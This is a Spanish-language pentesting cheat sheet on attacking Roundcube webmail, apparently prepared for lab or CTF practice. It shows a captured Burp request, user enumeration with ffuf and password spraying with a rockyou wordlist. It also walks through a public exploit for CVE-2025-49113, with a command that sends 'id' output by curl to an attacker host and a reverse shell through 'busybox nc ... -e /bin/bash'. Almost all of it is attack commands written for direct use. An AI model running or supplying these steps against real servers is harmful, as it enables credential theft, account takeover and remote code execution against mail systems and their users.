# RoundCube Webmail 

Tags: #RoundCube 

**Roundcube** es un **cliente de correo electrónico web (webmail)** que permite a los usuarios acceder, leer, enviar y administrar sus correos desde un navegador. Se conecta al servidor de correo mediante protocolos como **IMAP** para recibir/consultar mensajes y **SMTP** para enviarlos, funcionando principalmente como la interfaz web entre el usuario y el servidor de correo.

```bash 
http://IP/roundcube/index.php    # Panel de login 
```

```bash 
# Se necesitan credenciales válidas 

# Ruta par mirar correos
	Mail > Sent
```

## Fuerza bruta para encontrar un usuario válido 

```bash 
Paso 1:
Capturar el POST de 'Click here to reset your password' con Burpsuite 

POST /roundcube/1258dwd34xyz8ffwrt86ff4.php HTTP/1.1
Host: 10.1.125.74
Content-Length: 86
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36
Origin: http://10.1.125.74
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Sec-GPC: 1
Referer: http://10.1.125.74/roundcube/1258dwd34xyz8ffwrt86ff4.php
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.6
Cookie: roundcube_sessid=tb5riuikto3pjhrib28scuf8sn; PHPSESSID=sb27tcosc900flj0jfk28s46g4
Connection: keep-alive

csrf_token=c48778d3351da048dec10cf7caaea3081e470e1d5d68195d913b10a135bd9494&user=maria
```

```bash 
Paso 2: 
# Fuerza bruta para encontra la password de un usuario válido
NOTA: La lista de usuarios puede ser personalizada 


❯ ffuf -w users.txt \
  -u 'http://10.1.125.74/roundcube/1258dwd34xyz8ffwrt86ff4.php' \
  -X POST \
  -H 'Cookie: roundcube_sessid=c48778d3351da048dec10cf7caaea3081e470e1d5d68195d913b10a135bd9494; PHPSESSID=sb27tcosc900flj0jfk28s46g4' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'csrf_token=c48778d3351da048dec10cf7caaea3081e470e1d5d68195d913b10a135bd9494&user=FUZZ' \
  -t 1 -rate 5 -timeout 10 -ft '<1500'
```

## Fuerza bruta para encontrar la password de un usuario válido 
* [CubeSpraying.py](https://github.com/robotshell/cubeSpraying)
```bash 
❯ python cubeSpraying.py --url 'http://IP/roundcube/' -U user -P ../passwords.txt -t 2 -v 

	# U = Usuario válido 
	# P = Lista de passwords 
	# v = Verbose (Opcional)
	# t = Tiempo 

# Si se quiere usar Rockyou, se crea una lista limpia 
❯ strings /usr/share/wordlists/rockyou.txt > /usr/share/wordlists/rockyou_clean.txt
```

## Roundcube Webmail 1.5.9
* [PoC CVE-2025-49113](https://github.com/hakaioffsec/CVE-2025-49113-exploit)
```bash 
# Versiones vulnerables 
1.5.0 - 1.5.9
1.6.0 - 1.6.10

Paso 1:
❯ python3 -m http.server 80

Paso 2: Verificar que si funciona el exploit 
❯ php CVE-2025-49113.php http://IP/roundcube/ user 'Password' 'curl http://IP_Kali/$(id|base64 -w0)'
	# Usuario válido 
	# Password del usuario válido 

Paso 3:
❯ penelope -p 4445

Paso 4: Ejecutar una revershell 
❯ php CVE-2025-49113.php http://IP/roundcube/ user 'Password' 'busybox nc IP_Kali 4445 -e /bin/bash'
```